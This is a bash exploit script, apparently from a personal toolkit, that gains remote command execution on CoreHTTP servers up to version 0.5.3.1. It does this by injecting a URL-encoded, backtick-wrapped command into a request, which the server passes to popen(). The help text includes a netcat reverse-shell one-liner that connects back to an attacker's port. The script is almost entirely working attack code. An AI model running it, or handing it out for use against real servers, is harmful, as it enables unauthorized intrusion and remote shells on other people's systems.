#!/bin/bash
# Remote Command Execution
# CoreHTTP Server Version 0.5.3.1 and Below
#
# This command is used to obtain a reverse shell.
# CoreHTTP server fails to properly sanitize input before calling  the popen()
# function in http.c. This allows an attacker to execute arbitrary commands

# Allow Ctrl+C to kill pingsweep
trap '
  trap - INT # restore default INT handler
  kill -s INT "$$"
' INT

if [ -z "$1" ] || [ "$1" == '-h' ] || [ "$1" == '--help' ] ; then
                # This option displays a help message and command execution examples
                echo ""
                echo "OsbornePro corehttp-rev-shell 1.0 ( https://roberthosborne.com )"
                echo ""
                echo "USAGE:  -p <port> -u <url> -c <curl options>"
                echo ""
                echo "OPTIONS:"
                echo "  -h : Displays the help information for the command."
                echo "  -u : Define the full URL location to foo.pl"
		echo "  -c : Set options available in curl to adjust to a variety of situations"
                echo "  -s : Reverse shell command to execute. Other commands will work but they will not return any results"
                echo ""
                echo "EXAMPLES:"
                echo "  corehttp-rev-shell -u 'https://10.10.10.11:10443/dev/foo.pl' -p 10443 -c '--insecure' -s 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1337 >/tmp/f'"
                echo "  # This example executes a netcat OpenBSD reverse shell from 10.10.10.11 to your attack machine on port 1337."
                echo ""
                exit
fi

while getopts ":c:u:s:" OPT; do
        case $OPT in
                u) url=$OPTARG;;
                c) cmd=$OPTARG;;
		s) shell=$OPTARG;;
        esac
done

if [[ -z $url ]]; then
        printf "[!] URL was not defined\n"
        exit
fi

if [[ -z $cmd ]]; then 
	printf "[!] A reverse shell command was not defined\n"
fi

rawurlencode() {
  local string="${1}"
  local strlen=${#string}
  local encoded=""
  local pos c o

  for (( pos=0 ; pos<strlen ; pos++ )); do
     c=${string:$pos:1}
     case "$c" in
        [-_.~a-zA-Z0-9] ) o="${c}" ;;
        * )               printf -v o '%%%02x' "'$c"
     esac
     encoded+="${o}"
  done
  echo "${encoded}"    # You can either set a return variable (FASTER) 
  REPLY="${encoded}"   #+or echo the result (EASIER)... or both... :p
}
SHELL=$(rawurlencode "$shell")
URL=${url}"?%60"$SHELL"%26%60"

# printf "Sending request to $URL"

curl ${curlopts} "${URL}"
